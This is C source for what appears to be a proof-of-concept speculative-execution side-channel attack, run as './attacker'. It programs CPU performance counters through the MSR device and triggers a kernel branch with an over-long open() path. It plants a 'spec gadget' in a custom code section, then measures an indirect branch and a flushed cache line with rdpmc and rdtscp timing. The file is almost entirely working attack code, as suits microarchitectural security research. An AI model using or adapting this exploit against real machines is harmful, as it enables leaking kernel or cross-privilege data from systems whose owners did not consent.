#define _GNU_SOURCE

#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <stdint.h>
#include <errno.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/time.h>
#include <signal.h>
#include <assert.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <limits.h>
#include <string.h>

#include <x86intrin.h>
#include <fcntl.h>

unsigned char enumber1;
unsigned char umask1;

#define USER_SEL 0x410000
#define PMC_MSR0 0x0C1
#define PMC_MSR1 0x0C2
#define PERFEVTSEL0 0x186
#define PERFEVTSEL1 0x187
typedef unsigned long long u64;



#define PAGE_SIZE 4096
#define WAIT_C 10000

int true = 1;

uint64_t *m_samples;
uint64_t num_samples;

int glob_i = 0;

// illegal input cause a specifc control flow being executed in kernel space after system call
#define a4096 "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"


__attribute__((always_inline)) inline void clflush(volatile void *p){
    asm volatile ("clflush (%0)" :: "r"(p));
}

void setaffinity(int coreid) {
  cpu_set_t mask;
  CPU_ZERO(&mask);
  CPU_SET(coreid, &mask);
  if(sched_setaffinity( 0, sizeof(mask), &mask ) == -1 ) {
    perror("couldn't set affinity");
  }
}

__attribute__((always_inline)) inline uint64_t rdtsc(){
    unsigned int lo,hi;
    __asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
    return ((uint64_t)hi << 32) | lo;
}

__attribute__((always_inline)) inline uint64_t rdtscp(){
    unsigned int lo,hi;
    __asm__ __volatile__ ("rdtscp" : "=a" (lo), "=d" (hi));
    return ((uint64_t)hi << 32) | lo;
}

int open_msr_file() {
  FILE* f = fopen("/dev/cpu/3/msr", "r+");
  if(f == NULL) {
    perror("fopen error");
    return -1;
  }
  return fileno(f);
}
__attribute__((always_inline)) inline uint64_t read_msr(int msr_file, unsigned int msr) {
  uint64_t data = 0;
  long ret;
  ret = pread(msr_file, &data, sizeof(data), msr);
  if(ret != sizeof(data)) {
    errno = -ret;
    perror("rdmsr pread error");
  }
  return data;
}

unsigned long long rdtscl(void)
{
    unsigned int lo, hi;
    __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
    return ( (unsigned long long)lo)|( ((unsigned long long)hi)<<32 );
}

__attribute__((always_inline)) inline void write_msr(int msr_file, unsigned int msr, uint64_t data) {
  long ret;
  ret = pwrite(msr_file, &data, sizeof(data), msr);
  if(ret != sizeof(data)) {
    errno = -ret;
    perror("wrmsr pwrite error");
    fprintf(stderr, "MSR: %x, DATA: %lx\n", msr, data);
  }
}

__attribute__((always_inline)) inline uint64_t rdpmc(int n)
{
  unsigned int low, high;
  asm volatile("rdpmc" : "=a" (low), "=d" (high) : "c" (n));
  return low | ((u64)high) << 32;
}


__attribute__((always_inline)) inline uint64_t rdpmc_gen(){  
  int n = 0; 
  unsigned int low, high;
  asm volatile("rdpmc" : "=a" (low), "=d" (high) : "c" (n));
  return low | ((u64)high) << 32;
}


__attribute__((section(".bp_rev"))) uint64_t mid_land();

#define LOOP_IT 5 

int indicator_bit = 1;
int bit_bit = 0;
pid_t pid;
uint64_t dat; 
register uint64_t r14 asm ("r14");
register uint64_t r13 asm ("r13");


uint64_t staffer1[8000];
uint64_t staffer2[8000];
int sw = 2;

uint64_t begin_m, end_m;


__attribute__((section(".bp_rev"))) inline uint64_t mid_land(){
    asm("jmp target3");    

    asm("nop; nop; nop; nop; nop; nop; nop; nop;");
    
    asm("mov $0x8049fc00, %r12");  // spec gadget
    asm("add $0xe0, %r12");
    asm("mov (%r12), %r12");

    asm("target3:"); 
    asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;"); 
}





void stuffer(){
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  
  asm("nop; nop; nop; nop; nop; ");

  
  //189 nop
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
 

  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; nop;");
  asm("nop; nop; nop; nop; nop; nop; nop; nop; nop; ");

}

int main(int argc, char ** argv) {
  if(argc != 4 && argc != 5){
    printf("Usage: ./attacker num_probes enum umask [-v]\n");
    exit(1);
  }
  int num_probes = atoi(argv[1]);
  enumber1 = strtol(argv[2],NULL,16);
  umask1 = strtol(argv[3],NULL,16);
  int i;
  int verbose = 0;

  printf("sw @: %p dat @: %p\n", &sw, &dat);
  printf("begin_m @: %p end_m @: %p\n", &begin_m, &end_m);
  
  if(argc == 5){
  	if(strcmp(argv[4], "-v") != 0){
     printf("Usage: ./attacker num_probes [-v]\n");
     exit(1);
  	}
  	else verbose = 1;
	}
  //printf("0x%x 0x%x\n", enumber1, umask1);
	  
  /* Output T1 and T2 arrays */
  if(num_probes == 0){
  	printf("unsigned char T# [PAGE_SIZE] =\n{");
  	exit(0);
  }
  
  setaffinity(3);
  pid = getpid();
  
  int msr_file1 = open_msr_file();
  write_msr(msr_file1, PMC_MSR0, 0UL);
  write_msr(msr_file1, PERFEVTSEL0, USER_SEL + (0x100 * umask1) + enumber1);

  
  int bogus_count = 0;
  int sleep_time = 300;
  uint64_t t, z, result_sum = 0;
  uint64_t min_val = ULLONG_MAX;
  uint64_t t1,t2;
    mid_land(); // should bring sthe spec_gadget back to cache, this position could siginicantly improve the spec-load rate.
  for(i = 0; i<num_probes; i++){    

   clflush(&dat); 
      
    open(a4096,O_RDONLY,0); // execute syscall open() to active writer branch in kernel space
   
    for(int i = 0; i< WAIT_C; i++);    
    
    begin_m = rdpmc_gen(); // performanc counter for evaluations
    
    switch(sw){ // indirect branch inside of the switch statement will be reader branch
        case 0:        
            asm("nop; nop;");
            break;
        case 1:
            asm("nop; nop; nop;");
            break;
        case 2:
            asm("nop; nop; nop; nop;");
            end_m = rdpmc_gen();
            break;
        case 3:
            asm("nop; nop; nop; nop; nop;");
            break;
        case 4:
            asm("nop; nop; nop; nop; nop; nop;");
            break;
        case 5:
            asm("nop; nop; nop; nop; nop; nop; nop;");
            break;
        default:
            asm("nop; nop; nop; nop; nop; nop; nop; nop;");
            break;
    }
 
            
    t = end_m - begin_m;

    for(int i = 0; i< 2000; i++); 
    
    t1 = rdtscp();  // cache side channel for evaluation
    r13=dat;
    t2 = rdtscp();    


    result_sum += t;

    if(t < min_val) min_val = t; 

    if(verbose) printf("[%lu %lu] ", t, t2-t1);              
  }
  
  if(verbose) printf("\n");
  printf("avg T2 %f\n", result_sum / (float)(num_probes - bogus_count));
  printf("Min 2: %lu\n", min_val);

  return 0;
}


